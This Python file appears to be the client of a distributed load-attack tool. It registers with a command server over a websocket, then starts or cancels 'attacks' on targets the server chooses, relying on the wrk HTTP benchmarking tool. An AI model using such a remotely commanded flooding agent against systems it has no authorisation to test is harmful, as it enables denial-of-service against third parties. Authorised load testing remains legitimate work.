import logging
import sys
import asyncio

from asyncio import Queue
from websockets.exceptions import ConnectionClosed
from sanic.server.websockets.impl import WebsocketImplProtocol

from models import Action
from scripts.services.communication_services import wait_for_actions_from_server, dispatch_action, is_needed_to_stop
from scripts.services.connect_services import connect, register
from scripts.exceptions import CannotGetActionFromServerException


logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format='{%(filename)s:%(lineno)d} %(levelname)s - %(message)s'
)
logger = logging.getLogger(__package__)


async def handle_other_action(websocket: WebsocketImplProtocol, current_action_task: asyncio.Task, action: Action):
    if await is_needed_to_stop(action):
        logger.info(f"Server communicated to stop '{action.command.title}' on {action.target}")
        if not current_action_task.done():
            current_action_task.cancel()

    else:
        logger.info(f"Server communicated to start new attack while the current was not finished ")


async def handle_new_action(action: Action) -> asyncio.Task:
    return asyncio.create_task(dispatch_action(action))


async def handle_actions_from_server(websocket: WebsocketImplProtocol, actions_queue: Queue):
    handle_action_task = None

    while True:
        action = await actions_queue.get()
        if handle_action_task is not None and not handle_action_task.done():
            await handle_other_action(websocket, handle_action_task, action)
            continue

        handle_action_task = await handle_new_action(action)


async def start(addr: str):
    websocket = await connect(addr)
    if websocket is None:
        logger.fatal("Connection refused during connecting to the server")
        return -1
    logger.info(f"Connected to host server: {addr}")

    registration = await register(websocket)
    if registration is None:
        logger.fatal("Error trying to register this device on server")
        return -2
    logger.info(f"Registered on host server: {addr}")

    actions = Queue()

    try:
        actions_getter_task = asyncio.create_task(wait_for_actions_from_server(websocket, actions))
        await handle_actions_from_server(websocket, actions)

    except ConnectionClosed as e:
        logger.error(f"Connection was closed: {e}")
    except CannotGetActionFromServerException as e:
        logger.error(f"Cannot get action from server: {e}")

    finally:
        await websocket.close()


if __name__ == "__main__":
    from shutil import which

    if which("wrk") is None:
        print("wrk is not installed")
        print("To install wrk, use 'sudo apt-get install wrk if you are running on ubuntu, or install"
              "wrk from source https://github.com/wg/wrk")
        exit(-1)

    if len(sys.argv) < 2:
        print("Server address not specified\nUsage:\tpython3 connect.py <server_address>")
        exit(-1)

    asyncio.run(start(sys.argv[1]))
